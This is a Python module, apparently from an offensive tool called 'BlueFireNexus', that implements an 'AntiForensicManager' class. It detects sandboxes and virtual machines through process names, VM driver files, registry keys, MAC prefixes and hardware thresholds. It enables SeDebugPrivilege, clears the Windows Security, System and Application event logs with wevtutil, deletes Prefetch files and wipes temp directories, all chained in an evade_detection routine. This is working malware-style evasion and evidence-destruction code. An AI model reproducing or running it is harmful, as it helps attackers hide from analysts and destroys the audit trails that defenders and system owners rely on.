import os
import sys
import platform
import psutil
import ctypes
# Only import win32 modules if on Windows
if platform.system() == "Windows":
    import win32api
    import win32con
    import win32security
# Keep typing imports separate
from typing import List, Dict, Optional
# Use absolute imports if possible, assume they work
from src.core.logger import get_logger # Check if relative is needed based on structure
from src.core.security import security # Check if relative is needed

logger = get_logger(__name__)

class AntiForensicManager:
    """Anti-forensic and sandbox detection techniques.""" # Updated description

    def __init__(self):
        self.is_windows = platform.system() == "Windows"
        self.sandbox_indicators = {
            # Cross-platform process names
            "processes": [
                "wireshark", "procmon", "proc_analyzer", "sysinspector",
                "process_hacker", "autoit", "pestudio", "vmwaretray",
                "vmwareuser", "vboxservice", "vmtoolsd"
            ],
            # Windows-specific file indicators
            "files": [
                r"C:\WINDOWS\system32\drivers\vmhgfs.sys",
                r"C:\WINDOWS\system32\drivers\vmci.sys",
                # Removed duplicates
            ] if self.is_windows else [],
            # Windows-specific registry indicators
            "registry_keys": [
                r"SOFTWARE\VMware, Inc.\VMware Tools",
                r"SOFTWARE\Oracle\VirtualBox Guest Additions",
                r"SYSTEM\CurrentControlSet\Services\VBoxGuest"
            ] if self.is_windows else []
        }

    def detect_sandbox(self) -> bool:
        """
        Detect if running in a sandbox or common VM environment.

        Returns:
            bool: True if indicators detected, False otherwise
        """
        checks = [
            self._check_processes(),
            self._check_files(), # Will check empty list on non-windows
            self._check_registry(), # Will return False on non-windows
            self._check_memory(),
            self._check_cpu(),
            self._check_disk(),
            self._check_network()
        ]
        detected = any(checks)
        if detected:
            logger.warning("Potential sandbox/VM environment detected based on available checks.")
        return detected

    def _check_processes(self) -> bool:
        """Check for sandbox-related processes."""
        try:
            # Check if running processes match indicators
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info.get('name')
                    if proc_name and proc_name.lower() in self.sandbox_indicators["processes"]:
                        logger.debug(f"Sandbox indicator process found: {proc_name}")
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    # Ignore processes that disappear or we can't access
                    continue
                except Exception as e:
                     logger.warning(f"Error checking process {getattr(proc, 'pid', 'N/A')}: {e}") # Log unexpected errors
                     continue # Continue checking other processes
            return False
        except Exception as e:
             logger.error(f"Error iterating processes: {e}", exc_info=True)
             return False

    def _check_files(self) -> bool:
        """Check for sandbox-related files (Windows only)."""
        if not self.is_windows or not self.sandbox_indicators["files"]:
            return False # Only check these files on Windows if list is populated
        try:
            found = any(os.path.exists(path) for path in self.sandbox_indicators["files"])
            if found:
                 logger.debug("Sandbox indicator file found.")
            return found
        except Exception as e:
            logger.error(f"Error checking files: {e}", exc_info=True)
            return False

    def _check_registry(self) -> bool:
        """Check for sandbox-related registry keys (Windows only)."""
        if not self.is_windows or not self.sandbox_indicators["registry_keys"]:
            return False
        try:
            for key_path in self.sandbox_indicators["registry_keys"]:
                 # Use try-except for opening each key
                 key_handle = None
                 try:
                     # Attempt to open the key with read access
                     key_handle = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE, key_path, 0, win32con.KEY_READ)
                     if key_handle:
                         logger.debug(f"Sandbox indicator registry key found: HKLM\{key_path}")
                         win32api.RegCloseKey(key_handle)
                         return True
                 except OSError as e: # Catch potential errors like key not found
                     # ERROR_FILE_NOT_FOUND is expected if key doesn't exist
                     if e.winerror == 2:
                         continue # Key doesn't exist, continue checking others
                     else:
                         logger.warning(f"Error accessing registry key HKLM\{key_path}: {e}")
                 except Exception as e: # Catch other unexpected errors
                     logger.warning(f"Unexpected error checking registry key HKLM\{key_path}: {e}")
                 finally:
                     # Ensure the handle is closed if it was opened
                     if key_handle:
                         try:
                             win32api.RegCloseKey(key_handle)
                         except Exception: # Ignore errors on close
                              pass
            return False
        except Exception as e: # Catch errors during the loop setup itself
             logger.error(f"Error during registry check setup: {e}", exc_info=True)
             return False

    def _check_memory(self) -> bool:
        """Check for low total memory, often indicative of VMs."""
        try:
            total_memory_gb = psutil.virtual_memory().total / (1024**3)
            # Check for less than ~3.5 GB RAM as a more modern threshold
            threshold_gb = 3.5
            if total_memory_gb < threshold_gb:
                logger.debug(f"Low total memory detected: {total_memory_gb:.2f} GB (Threshold: < {threshold_gb} GB)")
                return True
        except psutil.Error as e:
            logger.warning(f"Could not check virtual memory: {e}")
        except Exception as e:
            logger.error(f"Unexpected error checking memory: {e}", exc_info=True)
        return False

    def _check_cpu(self) -> bool:
        """Check for low physical CPU core count."""
        try:
            # Prefer checking physical cores
            cpu_count = psutil.cpu_count(logical=False)
            threshold_cores = 2
            # Fallback to logical cores if physical count unavailable
            if cpu_count is None:
                 cpu_count = psutil.cpu_count(logical=True)
                 logger.debug("Physical core count unavailable, checking logical cores.")

            if cpu_count is not None and cpu_count < threshold_cores:
                logger.debug(f"Low CPU core count detected: {cpu_count} (Threshold: < {threshold_cores})")
                return True
        except NotImplementedError:
             logger.warning("Could not determine CPU core count on this platform.")
        except psutil.Error as e:
            logger.warning(f"Could not check CPU count: {e}")
        except Exception as e:
            logger.error(f"Unexpected error checking CPU: {e}", exc_info=True)
        return False

    def _check_disk(self) -> bool:
        """Check for suspicious disk properties (e.g., small size, VM-specific types)."""
        try:
            # Check total disk size of root partition
            root_usage = psutil.disk_usage(os.path.abspath(os.sep))
            total_disk_gb = root_usage.total / (1024**3)
            threshold_gb = 100
            if total_disk_gb < threshold_gb:
                 logger.debug(f"Low total disk size for root partition detected: {total_disk_gb:.2f} GB (Threshold: < {threshold_gb} GB)")
                 return True

            # Check for VM-specific file systems (like VirtualBox Shared Folders)
            for partition in psutil.disk_partitions():
                # Use case-insensitive check for file system type
                if partition.fstype and partition.fstype.lower() in ['vboxsf']:
                     logger.debug(f"VM-specific file system type detected: {partition.fstype} on {partition.device}")
                     return True
        except FileNotFoundError:
             logger.warning("Could not get disk usage for root partition.")
        except psutil.Error as e:
            logger.warning(f"Could not check disk partitions/usage: {e}")
        except Exception as e:
            logger.error(f"Unexpected error checking disk: {e}", exc_info=True)
        return False

    def _check_network(self) -> bool:
        """Check for indicators like a single network adapter or specific MAC prefixes."""
        vm_mac_prefixes = ("00:05:69", "00:0c:29", "00:1c:14", "00:50:56", "08:00:27") # VMware, VirtualBox
        try:
            interfaces = psutil.net_if_addrs()
            adapter_count = 0
            vm_mac_found = False

            for name, snics in interfaces.items():
                 is_loopback = name.lower().startswith(('lo', 'loopback'))
                 if not is_loopback:
                    adapter_count += 1
                    for snic in snics:
                         # Check for AF_LINK (MAC address)
                         if snic.family == psutil.AF_LINK and snic.address:
                              mac = snic.address.lower()
                              if any(mac.startswith(prefix) for prefix in vm_mac_prefixes):
                                   logger.debug(f"VM-specific MAC address prefix found: {mac} on interface {name}")
                                   vm_mac_found = True
                                   break # Found VM MAC on this interface
                    if vm_mac_found:
                         break # Stop checking interfaces if VM MAC found

            if vm_mac_found:
                return True # Prioritize VM MAC detection

            # Check for very few adapters (e.g., only one non-loopback) as a weaker indicator
            threshold_adapters = 1
            if adapter_count <= threshold_adapters:
                logger.debug(f"Low network adapter count detected: {adapter_count} non-loopback (Threshold: <= {threshold_adapters})")
                return True

        except psutil.Error as e:
            logger.warning(f"Could not check network interfaces: {e}")
        except Exception as e:
            logger.error(f"Unexpected error checking network: {e}", exc_info=True)
        return False

    def hide_process(self, pid: Optional[int] = None) -> bool:
        """
        Attempt to enable SeDebugPrivilege for the current or specified process (Windows Only).
        Note: This does NOT effectively hide the process from standard tools.
        Requires appropriate privileges (typically Administrator).

        Args:
            pid (Optional[int]): Process ID to target. Defaults to the current process (os.getpid()).

        Returns:
            bool: True if privilege adjustment was attempted successfully, False otherwise.
        """
        target_pid = pid or os.getpid()
        logger.warning(f"hide_process (PID: {target_pid}) is Windows-specific and only attempts to enable SeDebugPrivilege. It does not truly hide the process and requires elevation.")

        if not self.is_windows:
            logger.warning(f"hide_process skipped for PID {target_pid}: Not running on Windows.")
            return False

        process_handle = None
        token_handle = None
        try:
            # Get handle to the specified process (PROCESS_QUERY_INFORMATION is sufficient to get the token)
            process_handle = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, target_pid)

            # Open the process token with required privileges for adjustment
            token_handle = win32security.OpenProcessToken(process_handle, win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)

            # Lookup the LUID for SeDebugPrivilege
            privilege_luid = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")

            # Prepare the new privileges structure: (LUID, Attributes)
            # SE_PRIVILEGE_ENABLED tells it to enable the privilege.
            new_privileges = [(privilege_luid, win32con.SE_PRIVILEGE_ENABLED)]

            # Adjust the token privileges
            # The second argument 'False' means we are not disabling all privileges first.
            win32security.AdjustTokenPrivileges(token_handle, False, new_privileges)
            last_error = win32api.GetLastError()

            # Check AdjustTokenPrivileges result
            if last_error == win32con.ERROR_SUCCESS:
                 logger.info(f"Successfully enabled SeDebugPrivilege for PID {target_pid}.")
                 return True
            elif last_error == win32con.ERROR_NOT_ALL_ASSIGNED:
                 # This is the expected error if the user lacks the privilege (e.g., not admin)
                 logger.warning(f"Could not enable SeDebugPrivilege for PID {target_pid} (Requires elevation / privilege not held). Error: {last_error}")
                 return False # Indicate privilege was not assigned
            else:
                 # Other unexpected errors
                 logger.error(f"Failed to adjust token privileges for PID {target_pid}. Error code: {last_error}")
                 return False

        except win32security.error as e:
             # Catch specific pywin32 errors
             logger.error(f"Security error attempting to enable SeDebugPrivilege for PID {target_pid}: {e}", exc_info=True)
             return False
        except OSError as e:
             # Catch OS errors like invalid PID if OpenProcess fails
             logger.error(f"OS error attempting to enable SeDebugPrivilege for PID {target_pid}: {e}", exc_info=True)
             return False
        except Exception as e:
            # Catch any other unexpected errors
            logger.error(f"Unexpected error attempting to enable SeDebugPrivilege for PID {target_pid}: {e}", exc_info=True)
            return False
        finally:
            # Ensure handles are closed
            if token_handle:
                try: win32api.CloseHandle(token_handle)
                except: pass
            if process_handle:
                try: win32api.CloseHandle(process_handle)
                except: pass

    def clear_traces(self) -> bool:
        """
        Attempt to clear common forensic traces (Windows: event logs, prefetch; All: temp files).
        Note: Clearing event logs and prefetch typically requires Administrator privileges.

        Returns:
            bool: True if all attempted steps completed without fatal errors, False otherwise.
        """
        overall_success = True
        logger.info("Attempting to clear forensic traces...")

        # --- Clear Event Logs (Windows Only) ---
        if self.is_windows:
             logs_to_clear = ["System", "Security", "Application"]
             logger.info("Attempting to clear Windows event logs (requires elevation)...")
             cleared_any_log = False
             failed_any_log = False
             try:
                 import subprocess # Import here as it's only needed for this section
             except ImportError:
                 logger.error("`subprocess` module not found. Cannot attempt to clear event logs.")
                 failed_any_log = True

             if 'subprocess' in locals():
                 for log_name in logs_to_clear:
                     try:
                         # Use run to capture output/errors, check=True raises exception on failure
                         # Use CREATE_NO_WINDOW to prevent console window flashing
                         startupinfo = subprocess.STARTUPINFO()
                         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                         startupinfo.wShowWindow = subprocess.SW_HIDE

                         process = subprocess.run(
                             ["wevtutil", "cl", log_name],
                             check=False, # Check return code manually
                             capture_output=True, text=True, encoding='utf-8', errors='ignore',
                             startupinfo=startupinfo
                             )

                         if process.returncode == 0:
                              logger.debug(f"Successfully cleared '{log_name}' event log.")
                              cleared_any_log = True
                         else:
                              error_msg = f"Failed to clear '{log_name}' event log. RC: {process.returncode}. Stderr: {process.stderr.strip()}. Stdout: {process.stdout.strip()}"
                              if process.returncode == 5: # Access Denied
                                  logger.warning(f"{error_msg} (Requires elevation).")
                              else:
                                  logger.error(error_msg)
                              failed_any_log = True
                     except FileNotFoundError:
                         logger.error("`wevtutil` command not found. Cannot clear event logs.")
                         failed_any_log = True
                         break # Stop trying if command is missing
                     except Exception as e:
                         logger.error(f"Error running wevtutil to clear '{log_name}': {e}", exc_info=True)
                         failed_any_log = True
             if failed_any_log: # Mark overall failure if any log clear failed
                 overall_success = False
        else:
             logger.info("Skipping Windows event log clearing: Not on Windows.")


        # --- Clear Prefetch (Windows Only) ---
        if self.is_windows:
             prefetch_dir = os.path.join(os.environ.get("SystemRoot", "C:\Windows"), "Prefetch")
             if os.path.isdir(prefetch_dir): # Check if it's a directory
                  logger.info("Attempting to clear Windows prefetch files (requires elevation)...")
                  cleared_any_prefetch = False
                  failed_any_prefetch = False
                  try:
                      for filename in os.listdir(prefetch_dir):
                           file_path = os.path.join(prefetch_dir, filename)
                           try:
                               if os.path.isfile(file_path):
                                   os.remove(file_path)
                                   # logger.debug(f"Removed prefetch file: {filename}") # Can be very verbose
                                   cleared_any_prefetch = True
                           except OSError as e: # Catch permission errors etc.
                               logger.warning(f"Could not remove prefetch file '{filename}': {e} (Requires elevation?).")
                               failed_any_prefetch = True
                           except Exception as e:
                                logger.error(f"Unexpected error removing prefetch file '{filename}': {e}", exc_info=True)
                                failed_any_prefetch = True
                      if failed_any_prefetch:
                           overall_success = False
                  except Exception as e:
                      logger.error(f"Error accessing prefetch directory '{prefetch_dir}': {e}", exc_info=True)
                      overall_success = False
             else:
                  logger.warning(f"Prefetch directory not found or not accessible at '{prefetch_dir}'. Skipping.")
        else:
             logger.info("Skipping Windows prefetch clearing: Not on Windows.")


        # --- Clear Temp Files (Cross-platform) ---
        logger.info("Attempting to clear user temporary files...")
        # Get standard temp directory paths
        temp_dirs_to_check = []
        if self.is_windows:
             temp_dirs_to_check.extend([os.environ.get("TEMP"), os.environ.get("TMP")])
        else: # Linux/macOS
             temp_dirs_to_check.append("/tmp")
             # Consider adding user-specific cache? e.g., os.path.expanduser("~/.cache") - scope?
             user_home_tmp = os.path.join(os.path.expanduser("~"), ".tmp") # Some apps use ~/.tmp
             if os.path.isdir(user_home_tmp):
                temp_dirs_to_check.append(user_home_tmp)


        cleared_any_temp = False
        failed_any_temp = False
        processed_dirs = set() # Avoid processing same path twice if TEMP and TMP point to same loc

        for temp_dir in temp_dirs_to_check:
            if temp_dir and os.path.isdir(temp_dir) and temp_dir not in processed_dirs:
                processed_dirs.add(temp_dir)
                logger.debug(f"Processing temp directory: {temp_dir}")
                try:
                    for item_name in os.listdir(temp_dir):
                         item_path = os.path.join(temp_dir, item_name)
                         try:
                              # Attempt to remove both files and links
                              if os.path.isfile(item_path) or os.path.islink(item_path):
                                   # Use secure delete if available, otherwise normal delete
                                   if hasattr(security, 'secure_delete'):
                                        security.secure_delete(item_path)
                                   else:
                                        os.remove(item_path)
                                   # logger.debug(f"Removed temp item: {item_path}") # Verbose
                                   cleared_any_temp = True
                              elif os.path.isdir(item_path):
                                   # Skipping directory removal by default for safety
                                   # Consider adding recursive delete (shutil.rmtree) if desired, USE WITH EXTREME CAUTION
                                   pass
                         except OSError as e:
                              logger.warning(f"Could not remove temp item '{item_path}': {e}")
                              failed_any_temp = True
                         except Exception as e:
                              logger.error(f"Unexpected error removing temp item '{item_path}': {e}", exc_info=True)
                              failed_any_temp = True
                except Exception as e:
                     logger.error(f"Error listing or processing temp directory '{temp_dir}': {e}", exc_info=True)
                     failed_any_temp = True

        if failed_any_temp:
             overall_success = False


        if overall_success:
             logger.info("Trace clearing attempts finished.")
        else:
             logger.warning("Trace clearing finished with one or more non-fatal errors or permission issues.")
        return overall_success # Returns True if major steps attempted, False if fundamental errors occurred

    def evade_detection(self) -> Dict[str, bool]:
        """
        Apply multiple evasion techniques and checks.

        Returns:
            Dict[str, bool]: Status of each check/evasion technique attempt.
                           Keys indicate the action, values indicate success/detection status.
        """
        results = {
            "sandbox_detected": self.detect_sandbox(), # Already logs warning inside
            # Use a more accurate key name
            "privilege_adjusted": self.hide_process(), # Attempts on current process, logs inside
            # Use a more accurate key name
            "traces_cleared_attempted": self.clear_traces() # Logs inside
        }
        logger.info(f"Evasion detection results: {results}")
        return results

# --- Instance ---
# Create a global instance for easy import, or manage instantiation within BlueFireNexus
anti_forensic = AntiForensicManager() 